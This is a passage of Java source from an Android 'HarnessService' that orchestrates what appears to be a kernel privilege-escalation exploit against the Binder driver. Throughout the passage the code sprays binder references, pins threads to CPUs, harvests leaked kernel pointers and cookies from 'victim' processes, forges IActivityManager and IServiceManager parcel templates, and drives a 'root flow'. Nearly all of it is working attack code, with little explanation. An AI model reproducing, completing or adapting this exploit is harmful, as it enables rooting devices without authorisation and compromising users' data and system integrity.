                " cpu=" + cpu + " interleave=" + mixedInterleave +
                " received=[" + received + "]";
    }

    private String retainRawRootKernelAnchorPhase() {
        List<RawBinderHolderEndpoint> endpoints;
        synchronized (rawBinderHolderEndpoints) {
            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
        }
        if (!rawBinderHoldersActive || endpoints.size() !=
                RAW_BINDER_HOLDER_COUNT || kernelAnchor == null) {
            return "status=fail stage=raw-root-anchor-phase" +
                    " reason=preflight endpoints=" + endpoints.size();
        }
        int cpu = NativeBridge.pinCurrentThread(2);
        String phase = runRawBinderHolderPhase(
                endpoints, 1, -1, "raw-root-anchor-receiver",
                (parcel, holder) ->
                        parcel.writeStrongBinder(kernelAnchor));
        boolean pass = cpu == 2 && phase.startsWith("status=pass");
        kernelAnchorRetained = pass ? RAW_BINDER_HOLDER_COUNT : 0;
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-root-anchor-phase retained=" +
                kernelAnchorRetained + " cpu=" + cpu + " phase=[" +
                phase + "]";
    }

    private String retainRawCurrentProcMarkerPhase() {
        boolean pass = rawCurrentProcMarkerRetained ==
                RAW_CURRENT_PROC_MARKER_HOLDERS;
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-current-proc-marker mode=interleaved" +
                " retained=" + rawCurrentProcMarkerRetained +
                " expected=" + RAW_CURRENT_PROC_MARKER_HOLDERS;
    }

    @FunctionalInterface
    private interface RawHolderPhaseWriter {
        void write(Parcel parcel, int holder);
    }

    private String runRawBinderHolderPhase(
            List<RawBinderHolderEndpoint> endpoints, int objectCount,
            int deathObjectIndex, String threadName,
            RawHolderPhaseWriter writer) {
        return runRawBinderHolderPhase(
                endpoints, endpoints.size(), objectCount,
                deathObjectIndex, threadName, writer);
    }

    private String runRawBinderHolderPhase(
            List<RawBinderHolderEndpoint> endpoints, int holderCount,
            int objectCount, int deathObjectIndex, String threadName,
            RawHolderPhaseWriter writer) {
        FutureTask<String> receiver = new FutureTask<>(() ->
                NativeBridge.receiveRawBinderHolderRefs(
                        holderCount, objectCount,
                        RAW_BROKER_HOLDER_PROOF, deathObjectIndex));
        Thread receiverThread = new Thread(receiver, threadName);
        receiverThread.start();
        int submitted = 0;
        for (int holder = 0; holder < holderCount; holder++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInt(RAW_BROKER_HOLDER_PROOF);
                data.writeInt(objectCount);
                writer.write(data, holder);
                if (!endpoints.get(holder).callback.transact(
                        RAW_BROKER_HOLDER_CODE, data, reply, 0)) {
                    break;
                }
                reply.readException();
                if (reply.readInt() != RAW_BROKER_HOLDER_PROOF) {
                    break;
                }
                submitted++;
            } catch (RemoteException exception) {
                break;
            } finally {
                reply.recycle();
                data.recycle();
            }
        }
        String received;
        try {
            received = receiver.get(6, TimeUnit.SECONDS);
        } catch (InterruptedException exception) {
            Thread.currentThread().interrupt();
            received = "status=fail stage=raw-binder-holder-refs" +
                    " reason=interrupted";
        } catch (ExecutionException | TimeoutException exception) {
            received = "status=fail stage=raw-binder-holder-refs" +
                    " reason=receiver type=" +
                    exception.getClass().getSimpleName();
        }
        boolean pass = holderCount > 0 && holderCount <= endpoints.size() &&
                submitted == holderCount &&
                received.startsWith("status=pass");
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-binder-holder-phase objects=" + objectCount +
                " requested=" + holderCount + " submitted=" + submitted +
                " received=[" +
                received + "]";
    }

    private String retainCompactRawBinderHolderRefs(
            List<RawBinderHolderEndpoint> endpoints) {
        int cpu = NativeBridge.pinCurrentThread(2);
        String fillers = runRawBinderHolderPhase(
                endpoints, 8, -1, "raw-binder-filler-receiver",
                (parcel, holder) -> {
                    int first = holder * FILLERS_PER_PROCESS;
                    for (int filler = 0; filler < 8; filler++) {
                        parcel.writeStrongBinder(fillerNodes[
                                (first + filler) % fillerNodes.length]);
                    }
                });
        String controlled = fillers.startsWith("status=pass")
                ? runRawBinderHolderPhase(
                        endpoints, 1, -1,
                        "raw-binder-controlled-receiver",
                        (parcel, holder) ->
                                parcel.writeStrongBinder(controlledNode))
                : "status=fail stage=raw-binder-holder-phase" +
                        " reason=fillers";
        boolean pass = cpu == 2 && fillers.startsWith("status=pass") &&
                controlled.startsWith("status=pass");
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-binder-ref-spray mode=compact-phased" +
                " filler_range=8-8 cpu=" + cpu + " fillers=[" +
                fillers + "] controlled=[" + controlled + "]";
    }

    private String retainCompactRawRootBinderHolderRefs(
            List<RawBinderHolderEndpoint> endpoints, Parcel nodeTemplate) {
        int cpu = NativeBridge.pinCurrentThread(2);
        String fillers = runRawBinderHolderPhase(
                endpoints, 8, -1, "raw-root-binder-filler-receiver",
                (parcel, holder) -> {
                    int first = holder * FILLERS_PER_PROCESS;
                    for (int filler = 0; filler < 8; filler++) {
                        parcel.writeStrongBinder(fillerNodes[
                                (first + filler) % fillerNodes.length]);
                    }
                });
        String controlled = fillers.startsWith("status=pass")
                ? runRawBinderHolderPhase(
                        endpoints, 2, -2,
                        "raw-root-binder-controlled-receiver",
                        (parcel, holder) -> {
                            parcel.appendFrom(nodeTemplate, 0,
                                    nodeTemplate.dataSize());
                            parcel.writeStrongBinder(kernelAnchor);
                        })
                : "status=fail stage=raw-binder-holder-phase" +
                        " reason=fillers";
        rawControlledNodeParcel = null;
        nodeTemplate.recycle();
        boolean pass = cpu == 2 && fillers.startsWith("status=pass") &&
                controlled.startsWith("status=pass");
        kernelAnchorRetained = pass ? RAW_BINDER_HOLDER_COUNT : 0;
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-root-binder-ref-spray mode=compact-phased" +
                " filler_range=8-8 anchors=" + kernelAnchorRetained +
                " proxy_materialised=0 template_released=1 cpu=" + cpu +
                " fillers=[" + fillers + "] controlled=[" +
                controlled + "]";
    }

    private String extendMixedEpitemsForHolderCount(int submitted) {
        return "";
    }

    private String releaseRawBinderHolders() {
        List<RawBinderHolderEndpoint> endpoints;
        synchronized (rawBinderHolderEndpoints) {
            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
        }
        if (!rawBinderHoldersActive && endpoints.isEmpty()) {
            return "status=pass stage=raw-binder-holder-release skipped=1";
        }
        int releaseCpu = NativeBridge.pinCurrentThread(0);
        String nativeRelease = NativeBridge.releaseRawBinderRouteProbes();
        long deadline = SystemClock.elapsedRealtime() +
                TERMINAL_RETIREMENT_TIMEOUT_MS;
        int deaths = 0;
        for (RawBinderHolderEndpoint endpoint : endpoints) {
            long remaining = deadline - SystemClock.elapsedRealtime();
            String death = NativeBridge.awaitBinderDeathBarrier(
                    endpoint.deathBarrier,
                    (int) Math.max(1, Math.min(Integer.MAX_VALUE,
                            remaining)));
            endpoint.deathBarrier = 0;
            if (death.startsWith("status=pass")) {
                deaths++;
            }
        }
        synchronized (rawBinderHolderEndpoints) {
            rawBinderHolderEndpoints.clear();
        }
        String retirementProof = isRootFlow() &&
                nativeRelease.startsWith("status=pass") &&
                deaths == endpoints.size()
                ? NativeBridge.proveRawBinderHoldersRetired(
                        isolatedRetirementGeneration,
                        endpoints.size(), deaths)
                : "status=pass stage=raw-holder-retirement-proof" +
                        " skipped=1";
        rawBinderHoldersActive = false;
        rawBinderPrimeNodes = null;
        if (rawControlledNodeParcel != null) {
            rawControlledNodeParcel.recycle();
            rawControlledNodeParcel = null;
        }
        int restoredCpu = NativeBridge.pinCurrentThread(2);
        boolean pass = releaseCpu == 0 && restoredCpu == 2 &&
                nativeRelease.startsWith("status=pass") &&
                deaths == endpoints.size() &&
                retirementProof.startsWith("status=pass");
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-binder-holder-release endpoints=" +
                endpoints.size() + " deaths=" + deaths +
                " release_cpu=" + releaseCpu +
                " restored_cpu=" + restoredCpu +
                " proof=[" + retirementProof + "]" +
                " native=[" + nativeRelease + "]";
    }

    private void queueControlledNode() throws Exception {
        Parcel data = Parcel.obtain();
        try {
            if (!controlledNode.transact(
                    OwnerService.TRANSACTION_CONTROLLED_HOLD,
                    data, null, IBinder.FLAG_ONEWAY)) {
                throw new IllegalStateException("controlled-queue");
            }
        } finally {
            data.recycle();
        }
    }

    private String exportRawControlledNode() {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        Parcel candidateNode = null;
        try {
            IBinder service;
            ProcessIdentity identity;
            synchronized (this) {
                service = rawClientService;
                identity = rawClientProcessIdentity;
            }
            if (service == null || identity == null ||
                    !isOriginalIdentityLive(identity) || !service.transact(
                    RawBClientService.TRANSACTION_EXPORT, data, reply, 0)) {
                return "status=fail stage=raw-controlled-export " +
                        "reason=transaction";
            }
            reply.readException();
            String state = reply.readString();
            int exportedPid = reply.readInt();
            rawControlledPointer = reply.readLong();
            rawControlledCookie = reply.readLong();
            int siblingCount = reply.readInt();
            int expectedSiblings = useMixedDisclosure()
                    ? RawBClientService.RAW_COHORT_COUNT - 1 : 0;
            if (siblingCount != expectedSiblings) {
                return "status=fail stage=raw-controlled-export " +
                        "reason=cohort-count count=" + siblingCount +
                        " expected=" + expectedSiblings;
            }
            IBinder[] siblings = new IBinder[siblingCount];
            Set<IBinder> uniqueSiblings = new HashSet<>();
            for (int index = 0; index < siblingCount; index++) {
                siblings[index] = reply.readStrongBinder();
                if (siblings[index] == null ||
                        !uniqueSiblings.add(siblings[index])) {
                    return "status=fail stage=raw-controlled-export " +
                            "reason=cohort-sibling index=" + index;
                }
            }
            int nodeOffset = reply.dataPosition();
            int nodeLength = reply.dataAvail();
            if (nodeLength <= 0) {
                return "status=fail stage=raw-controlled-export " +
                        "reason=node-template-empty";
            }
            candidateNode = Parcel.obtain();
            candidateNode.appendFrom(reply, nodeOffset, nodeLength);
            Parcel inspection = Parcel.obtain();
            String nodeState;
            try {
                inspection.writeInt(RAW_BROKER_ROOT_PROOF);
                inspection.appendFrom(candidateNode, 0,
                        candidateNode.dataSize());
                nodeState = NativeBridge.inspectRemoteBinderParcel(
                        inspection);
            } finally {
                inspection.recycle();
            }
            String cohortState = siblingCount == 0
                    ? "status=pass stage=raw-cohort-validate skipped=1"
                    : siblingCount == expectedSiblings
                            ? NativeBridge.validateRawCohort(
                                    siblings, expectedSiblings)
                            : "status=fail stage=raw-cohort-validate " +
                                    "reason=count";
            File ownerResult = new File(getFilesDir(),
                    "raw-cohort-export.result");
            String ownerState = ownerResult.exists()
                    ? readSmall(ownerResult)
                    : "status=pass stage=raw-cohort-export skipped=1";
            if (state == null || !state.startsWith("status=pass") ||
                    exportedPid != identity.pid ||
                    rawControlledPointer == 0 ||
                    rawControlledCookie == 0 ||
                    !nodeState.startsWith("status=pass") ||
                    !cohortState.startsWith("status=pass") ||
                    !ownerState.startsWith("status=pass")) {
                return "status=fail stage=raw-controlled-export " +
                        "reason=payload client=[" + state +
                        "] node=[" + nodeState +
                        "] cohort=[" + cohortState + "] owner=[" +
                        ownerState + "]";
            }
            synchronized (this) {
                if (rawClientService != service ||
                        rawClientProcessIdentity != identity ||
                        rawClientConnectionFailed || rawClientRetiring) {
                    return "status=fail stage=raw-controlled-export " +
                            "reason=client-changed";
                }
                rawClientPid = exportedPid;
                if (rawControlledNodeParcel != null) {
                    rawControlledNodeParcel.recycle();
                }
                rawControlledNodeParcel = candidateNode;
                candidateNode = null;
            }
            rawCohortSiblings = siblingCount == 0 ? null : siblings;
            return state + " siblings=" + siblingCount +
                    " cohort=[" + cohortState + "] owner=[" +
                    ownerState + "] node=[" + nodeState + "]";
        } catch (Exception exception) {
            return "status=fail stage=raw-controlled-export reason=" +
                    exception.getClass().getSimpleName();
        } finally {
            if (candidateNode != null) {
                candidateNode.recycle();
            }
            reply.recycle();
            data.recycle();
        }
    }

    private String prepareRawClient() throws Exception {
        CountDownLatch connected = new CountDownLatch(1);
        ServiceConnection clientConnection = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name,
                                           IBinder service) {
                boolean accepted = false;
                synchronized (HarnessService.this) {
                    if (rawClientConnection == this && rawClientBound &&
                            !rawClientConnectedOnce &&
                            !rawClientRetiring &&
                            !rawClientConnectionFailed &&
                            rawClientService == null) {
                        rawClientService = service;
                        rawClientConnectedOnce = true;
                        accepted = true;
                    } else if (rawClientConnection == this &&
                            !rawClientRetiring) {
                        rawClientConnectionFailed = true;
                    }
                }
                if (accepted) {
                    connected.countDown();
                } else {
                    unbindMainRawClientConnection(this);
                }
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                boolean owned;
                synchronized (HarnessService.this) {
                    owned = rawClientConnection == this;
                    if (owned) {
                        rawClientService = null;
                        if (!rawClientRetiring) {
                            rawClientConnectionFailed = true;
                        }
                    }
                }
                if (owned) {
                    unbindMainRawClientConnection(this);
                }
            }

            @Override
            public void onBindingDied(ComponentName name) {
                onServiceDisconnected(name);
            }

            @Override
            public void onNullBinding(ComponentName name) {
                synchronized (HarnessService.this) {
                    if (rawClientConnection == this &&
                            !rawClientRetiring) {
                        rawClientConnectionFailed = true;
                    }
                }
                connected.countDown();
                unbindMainRawClientConnection(this);
            }
        };
        synchronized (this) {
            if (rawClientConnection != null || rawClientBound ||
                    rawClientUnbinding) {
                return "status=fail stage=raw-client reason=old-binding";
            }
            rawClientConnection = clientConnection;
            rawClientService = null;
            rawClientProcessIdentity = null;
            rawClientPid = -1;
            rawClientBound = true;
            rawClientUnbinding = false;
            rawClientConnectedOnce = false;
            rawClientRetiring = false;
            rawClientConnectionFailed = false;
        }
        boolean bound = bindService(new Intent(this, RawBClientService.class),
                clientConnection, Context.BIND_AUTO_CREATE);
        if (!bound) {
            synchronized (this) {
                if (rawClientConnection == clientConnection) {
                    rawClientConnection = null;
                    rawClientBound = false;
                    rawClientUnbinding = false;
                    rawClientConnectionFailed = true;
                }
            }
            connected.countDown();
        }
        if (!bound || !connected.await(30, TimeUnit.SECONDS)) {
            unbindMainRawClientConnection(clientConnection);
            return "status=fail stage=raw-client reason=bind";
        }
        IBinder service;
        boolean validConnection;
        synchronized (this) {
            service = rawClientService;
            validConnection = service != null &&
                    rawClientConnection == clientConnection &&
                    rawClientBound && rawClientConnectedOnce &&
                    !rawClientUnbinding && !rawClientConnectionFailed;
        }
        if (!validConnection) {
            unbindMainRawClientConnection(clientConnection);
            return "status=fail stage=raw-client reason=bind";
        }
        ProcessIdentity identity = queryServiceIdentity(service,
                RawBClientService.TRANSACTION_IDENTITY);
        if (identity == null || identity.pid <= 0 ||
                identity.pid == Process.myPid() || identity.startTime <= 0 ||
                !isOriginalIdentityLive(identity)) {
            synchronized (this) {
                rawClientConnectionFailed = true;
            }
            unbindMainRawClientConnection(clientConnection);
            return "status=fail stage=raw-client reason=identity";
        }
        boolean unchanged;
        synchronized (this) {
            unchanged = rawClientConnection == clientConnection &&
                    rawClientService == service && rawClientBound &&
                    !rawClientUnbinding && !rawClientConnectionFailed;
            if (unchanged) {
                rawClientProcessIdentity = identity;
            }
        }
        if (!unchanged) {
            unbindMainRawClientConnection(clientConnection);
            return "status=fail stage=raw-client reason=changed";
        }
        return "status=pass stage=raw-client connected=1";
    }

    private String connectExtraRawClients() throws Exception {
        new File(getFilesDir(), "raw-extra-export.enable").delete();
        new File(getFilesDir(), "raw-extra-export.ready").delete();
        new File(getFilesDir(), "raw-extra-export.thread-ready").delete();
        new File(getFilesDir(), "raw-extra-export.looper-go").delete();
        new File(getFilesDir(), "raw-extra-export.go").delete();
        new File(getFilesDir(), "raw-extra-export.submitting").delete();
        new File(getFilesDir(), "raw-extra-export.reply-go").delete();
        new File(getFilesDir(),
                "raw-extra-export.target-result").delete();
        for (int index = 0; index < extraRawClientSlots.length; index++) {
            new File(getFilesDir(),
                    "raw-extra-export.thread-ready." + index).delete();
            new File(getFilesDir(),
                    "raw-extra-export.ready." + index).delete();
            new File(getFilesDir(),
                    "raw-extra-export.target-result." +
                            (index + 1)).delete();
            new File(getFilesDir(),
                    "raw-extra-export.result." + index).delete();
            new File(getFilesDir(),
                    "raw-extra-queue.enable." + index).delete();
        }
        releaseExtraRawClientSlots(true);
        CountDownLatch connected =
                new CountDownLatch(extraRawClientSlots.length);
        for (RawClientSlot slot : extraRawClientSlots) {
            ServiceConnection slotConnection = new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name,
                                               IBinder service) {
                    boolean accepted = false;
                    synchronized (extraRawClientLock) {
                        if (slot.connection == this && slot.bound &&
                                slot.state == RawClientSlotState.ACTIVE &&
                                !slot.connectedOnce &&
                                !slot.unbinding && slot.service == null) {
                            slot.service = service;
                            slot.connectedOnce = true;
                            accepted = true;
                        } else if (slot.connection == this &&
                                slot.state == RawClientSlotState.ACTIVE) {
                            slot.state = RawClientSlotState.FAILED;
                        }
                    }
                    if (accepted) {
                        connected.countDown();
                    } else {
                        unbindExtraRawClientSlot(slot, this);
                    }
                }

                @Override
                public void onServiceDisconnected(ComponentName name) {
                    boolean owned;
                    boolean initial;
                    synchronized (extraRawClientLock) {
                        owned = slot.connection == this;
                        initial = owned && !slot.connectedOnce;
                        if (owned) {
                            slot.service = null;
                            if (slot.state == RawClientSlotState.ACTIVE) {
                                slot.state = RawClientSlotState.FAILED;
                            }
                        }
                    }
                    if (initial) {
                        connected.countDown();
                    }
                    if (owned) {
                        unbindExtraRawClientSlot(slot, this);
                    }
                }

                @Override
                public void onBindingDied(ComponentName name) {
                    onServiceDisconnected(name);
                }

                @Override
                public void onNullBinding(ComponentName name) {
                    boolean owned;
                    synchronized (extraRawClientLock) {
                        owned = slot.connection == this;
                        if (owned) {
                            slot.state = RawClientSlotState.FAILED;
                        }
                    }
                    connected.countDown();
                    if (owned) {
                        unbindExtraRawClientSlot(slot, this);
                    }
                }
            };
            synchronized (extraRawClientLock) {
                if (slot.state != RawClientSlotState.EMPTY ||
                        slot.connection != null || slot.bound ||
                        slot.unbinding || slot.service != null ||
                        slot.deathBarrier != 0) {
                    return "status=fail stage=raw-client-extra " +
                            "reason=old-binding index=" + slot.index;
                }
                slot.connection = slotConnection;
                slot.bound = true;
                slot.state = RawClientSlotState.ACTIVE;
            }
            if (!bindService(new Intent(this, slot.serviceClass),
                    slotConnection, Context.BIND_AUTO_CREATE)) {
                synchronized (extraRawClientLock) {
                    if (slot.connection == slotConnection) {
                        slot.connection = null;
                        slot.bound = false;
                        slot.state = RawClientSlotState.FAILED;
                    }
                }
                connected.countDown();
            }
        }
        if (!connected.await(30, TimeUnit.SECONDS)) {
            return "status=fail stage=raw-client-extra reason=timeout";
        }
        synchronized (extraRawClientLock) {
            for (RawClientSlot slot : extraRawClientSlots) {
                if (slot.state != RawClientSlotState.ACTIVE ||
                        slot.connection == null || !slot.bound ||
                        slot.unbinding || !slot.connectedOnce ||
                        slot.service == null) {
                    return "status=fail stage=raw-client-extra " +
                            "reason=bind index=" + slot.index;
                }
            }
        }
        AtomicInteger prepared = new AtomicInteger();
        CountDownLatch preparationComplete =
                new CountDownLatch(extraRawClientSlots.length);
        for (RawClientSlot slot : extraRawClientSlots) {
            IBinder service;
            synchronized (extraRawClientLock) {
                service = slot.service;
            }
            new Thread(() -> {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    if (service.transact(
                            RawBClientService.TRANSACTION_PREPARE_TARGET,
                            data, reply, 0)) {
                        reply.readException();
                        String state = reply.readString();
                        if (state != null &&
                                state.startsWith("status=pass")) {
                            prepared.incrementAndGet();
                        }
                    }
                } catch (Exception ignored) {
                } finally {
                    reply.recycle();
                    data.recycle();
                    preparationComplete.countDown();
                }
            }, "raw-client-prepare-" + slot.index).start();
        }
        boolean preparationFinished =
                preparationComplete.await(30, TimeUnit.SECONDS);
        return "status=" +
                (preparationFinished &&
                 prepared.get() == extraRawClientSlots.length
                        ? "pass" : "fail") +
                " stage=raw-client-extra prepared=" + prepared.get();
    }

    private String prepareDeferredRawClients() throws Exception {
        writePrivate("raw-extra-export.receivers-go",
                "status=pass stage=raw-extra-export-receivers-go");
        for (int index = 0; index < RAW_VICTIM_COUNT - 1; index++) {
            File ready = new File(getFilesDir(),
                    "raw-extra-export.thread-ready." + index);
            waitForEither(ready, null, 30000);
            if (!ready.exists()) {
                return "status=fail stage=raw-extra-receivers reason=thread";
            }
        }
        writePrivate("raw-extra-export.looper-go",
                "status=pass stage=raw-extra-export-looper-go");
        for (int index = 0; index < RAW_VICTIM_COUNT - 1; index++) {
            File ready = new File(getFilesDir(),
                    "raw-extra-export.ready." + index);
            waitForEither(ready, null, 30000);
            if (!ready.exists()) {
                return "status=fail stage=raw-extra-receivers reason=looper";
            }
        }
        releaseExtraRawClientSlots(true);
        Parcel serviceManager = Parcel.obtain();
        Parcel startService = Parcel.obtain();
        String serviceExport;
        String startExport;
        File serviceTemplate = new File(getFilesDir(),
                "raw-route-victim-service.template");
        File startTemplate = new File(getFilesDir(),
                "raw-route-victim-start.template");
        try {
            Binder callbackMarker = new Binder();
            serviceManager.writeInterfaceToken("android.os.IServiceManager");
            serviceManager.writeString("activity");
            Intent broker = new Intent(this, HarnessService.class);
            broker.putExtra("stage", "raw-binder-broker");
            broker.putExtra(RAW_BROKER_VICTIM_EXTRA, true);
            android.os.Bundle extras = broker.getExtras();
            if (extras == null) {
                extras = new android.os.Bundle();
            }
            extras.putBinder(RAW_BROKER_CALLBACK_EXTRA, callbackMarker);
            broker.replaceExtras(extras);
            startService.writeInterfaceToken(
                    "android.app.IActivityManager");
            startService.writeStrongBinder(null);
            startService.writeTypedObject(broker, 0);
            startService.writeString(null);
            startService.writeBoolean(false);
            startService.writeString(getPackageName());
            startService.writeString(null);
            startService.writeInt(Process.myUid() / 100000);
            serviceExport = NativeBridge.exportParcelTemplate(
                    serviceManager, serviceTemplate.getPath());
            startExport = NativeBridge.exportParcelTemplate(
                    startService, startTemplate.getPath());
        } finally {
            startService.recycle();
            serviceManager.recycle();
        }
        boolean templates = serviceExport.startsWith("status=pass") &&
                startExport.startsWith("status=pass");
        String started = templates
                ? NativeBridge.startRawVictimExports(
                        serviceTemplate.getPath(), startTemplate.getPath(),
                        RAW_VICTIM_COUNT - 1)
                : "status=fail stage=raw-victim-export-start" +
                        " reason=templates";
        rawVictimContextsActive = started.startsWith("status=pass");
        extraRawClientState = started;
        return "status=" + (rawVictimContextsActive ? "pass" : "fail") +
                " stage=raw-extra-deferred mode=native-contexts" +
                " service=[" + serviceExport + "] start_template=[" +
                startExport + "] cohort=[" + started + "]";
    }

    private String exportAndArmExtraRawClients() throws Exception {
        AtomicInteger armed = new AtomicInteger();
        CountDownLatch armingComplete =
                new CountDownLatch(extraRawClientSlots.length);
        IBinder[] services = new IBinder[extraRawClientSlots.length];
        synchronized (extraRawClientLock) {
            for (RawClientSlot slot : extraRawClientSlots) {
                if (slot.state != RawClientSlotState.ACTIVE ||
                        slot.connection == null || !slot.bound ||
                        slot.unbinding || slot.service == null) {
                    return "status=fail stage=raw-extra-export-armed" +
                            " reason=slot index=" + slot.index;
                }
                slot.pid = -1;
                slot.identity = null;
                slot.pointer = 0;
                slot.cookie = 0;
                services[slot.index] = slot.service;
            }
        }
        for (RawClientSlot slot : extraRawClientSlots) {
            IBinder service = services[slot.index];
            new Thread(() -> {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInt(slot.index);
                    if (service.transact(
                            RawBClientService.TRANSACTION_START_DEFERRED_EXPORT,
                            data, reply, 0)) {
                        reply.readException();
                        String state = reply.readString();
                        if (state != null &&
                                state.startsWith("status=pass")) {
                            armed.incrementAndGet();
                        }
                    }
                } catch (Exception ignored) {
                } finally {
                    reply.recycle();
                    data.recycle();
                    armingComplete.countDown();
                }
            }, "raw-client-arm-" + slot.index).start();
        }
        boolean armingFinished = armingComplete.await(30, TimeUnit.SECONDS);
        return "status=" + (armingFinished &&
                        armed.get() == RAW_VICTIM_COUNT - 1
                        ? "pass" : "fail") +
                " stage=raw-extra-export-armed clients=" + armed.get();
    }

    private String collectExtraRawClients() throws Exception {
        if (rawVictimContextsActive) {
            long[] tokens = NativeBridge.collectRawVictimExports(
                    RAW_VICTIM_COUNT - 1);
            if (tokens == null ||
                    tokens.length != (RAW_VICTIM_COUNT - 1) * 2) {
                return "status=fail stage=raw-extra-export-collected" +
                        " mode=native-contexts reason=tokens";
            }
            Set<Long> pointers = new HashSet<>();
            synchronized (extraRawClientLock) {
                for (RawClientSlot slot : extraRawClientSlots) {
                    long pointer = tokens[slot.index * 2];
                    long cookie = tokens[slot.index * 2 + 1];
                    if (pointer == 0 || cookie == 0 ||
                            !pointers.add(pointer)) {
                        return "status=fail" +
                                " stage=raw-extra-export-collected" +
                                " mode=native-contexts reason=payload" +
                                " index=" + slot.index;
                    }
                    slot.pointer = pointer;
                    slot.cookie = cookie;
                    slot.state = RawClientSlotState.CONSUMED;
                }
            }
            return "status=pass stage=raw-extra-export-collected" +
                    " mode=native-contexts clients=" +
                    (RAW_VICTIM_COUNT - 1);
        }
        Set<Integer> pids = new HashSet<>();
        int collected = 0;
        for (RawClientSlot slot : extraRawClientSlots) {
            int index = slot.index;
            IBinder service;
            synchronized (extraRawClientLock) {
                if (slot.state != RawClientSlotState.ACTIVE ||
                        slot.connection == null || !slot.bound ||
                        slot.unbinding || slot.service == null) {
                    break;
                }
                service = slot.service;
            }
            File result = new File(getFilesDir(),
                    "raw-extra-export.result." + index);
            waitForEither(result, null, 30000);
            String state = readSmall(result);
            int pid = parseIntField(state, "pid=");
            long startTime = parseLongField(state, "start_time=");
            long pointer = parseHexLongField(state, "pointer=0x");
            long cookie = parseHexLongField(state, "cookie=0x");
            ProcessIdentity exactIdentity = queryServiceIdentity(
                    service,
                    RawBClientService.TRANSACTION_IDENTITY);
            long deathBarrier = exactIdentity == null ? 0 :
                    NativeBridge.armBinderDeathBarrier(service);
            if (!state.startsWith("status=pass") || pid <= 0 ||
                    startTime <= 0 ||
                    exactIdentity == null || exactIdentity.pid != pid ||
                    exactIdentity.startTime != startTime ||
                    pointer == 0 || cookie == 0 || !pids.add(pid) ||
                    !isOriginalIdentityLive(exactIdentity) ||
                    deathBarrier == 0) {
                if (deathBarrier != 0) {
                    NativeBridge.discardBinderDeathBarrier(deathBarrier);
                }
                break;
            }
            boolean accepted = false;
            synchronized (extraRawClientLock) {
                if (slot.state != RawClientSlotState.ACTIVE ||
                        slot.service != service || !slot.bound ||
                        slot.unbinding || slot.deathBarrier != 0) {
                    accepted = false;
                } else {
                    slot.pid = pid;
                    slot.identity = exactIdentity;
                    slot.pointer = pointer;
                    slot.cookie = cookie;
                    slot.deathBarrier = deathBarrier;
                    accepted = true;
                }
            }
            if (!accepted) {
                NativeBridge.discardBinderDeathBarrier(deathBarrier);
                break;
            }
            collected++;
        }
        return "status=" +
                (collected == RAW_VICTIM_COUNT - 1 ? "pass" : "fail") +
                " stage=raw-extra-export-collected clients=" + collected;
    }

    private String prepareRawTarget() throws Exception {
        CountDownLatch connected = new CountDownLatch(1);
        rawTargetConnection = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name,
                                           IBinder service) {
                rawTargetService = service;
                connected.countDown();
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                rawTargetService = null;
            }
        };
        int boundarySignalFd =
                NativeBridge.createRawTargetBoundarySignal();
        if (boundarySignalFd < 0) {
            return "status=fail stage=raw-target reason=boundary-signal";
        }
        Intent targetIntent = new Intent(this, RawTargetService.class)
                .putExtra(RawTargetService.EXTRA_NONCE,
                        rootWatchdogNonce)
                .putExtra(RawTargetService.EXTRA_BOOT_ID,
                        rootWatchdogBootId)
                .putExtra(RawTargetService.EXTRA_TERMINAL_CLEANUP,
                        directTerminalCleanup);
        boolean bound = bindService(targetIntent,
                rawTargetConnection, Context.BIND_AUTO_CREATE) &&
                connected.await(30, TimeUnit.SECONDS) &&
                rawTargetService != null;
        if (!bound) {
            NativeBridge.closeRawTargetBoundarySignal();
            return "status=fail stage=raw-target reason=bind";
        }
        boolean boundaryArmed = false;
        try (ParcelFileDescriptor boundarySignal =
                     ParcelFileDescriptor.fromFd(boundarySignalFd)) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeFileDescriptor(boundarySignal.getFileDescriptor());
                boundaryArmed = rawTargetService.transact(
                        RawTargetService.TRANSACTION_BOUNDARY_SIGNAL,
                        data, reply, 0);
                if (boundaryArmed) {
                    reply.readException();
                    boundaryArmed = reply.readInt() == 1;
                }
            } finally {
                reply.recycle();
                data.recycle();
            }
        } catch (Exception ignored) {
            boundaryArmed = false;
        }
        if (!boundaryArmed) {
            NativeBridge.closeRawTargetBoundarySignal();
            return "status=fail stage=raw-target reason=boundary-transport";
        }
        rawTargetProcessIdentity = queryServiceIdentity(
                rawTargetService, RawTargetService.TRANSACTION_IDENTITY);
        if (rawTargetProcessIdentity == null) {
            return "status=fail stage=raw-target reason=identity";
        }
        for (int index = 0; index < RawTargetService.BLOCKER_COUNT; index++) {
            Thread blocker = new Thread(() -> {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    IBinder target = rawTargetService;
                    if (target != null) {
                        target.transact(RawTargetService.TRANSACTION_BLOCK,
                                data, reply, 0);
                    }
                } catch (Exception ignored) {
                } finally {
                    reply.recycle();
                    data.recycle();
                }
            }, "raw-target-blocker-" + index);
            blocker.start();
        }
        File blocked = new File(getFilesDir(), "raw-target.blocked");
        File failed = new File(getFilesDir(), "raw-target.result");
        waitForEither(blocked, failed, 60000);
        if (!blocked.exists()) {
            return readSmall(failed);
        }
        String blockedState = readSmall(blocked);
        rawTargetPid = parseIntField(blockedState, "pid=");
        long rawTargetStart = parseLongField(
                blockedState, "start_time=");
        if (!blockedState.startsWith("status=ready") || rawTargetPid <= 0 ||
                rawTargetPid != rawTargetProcessIdentity.pid ||
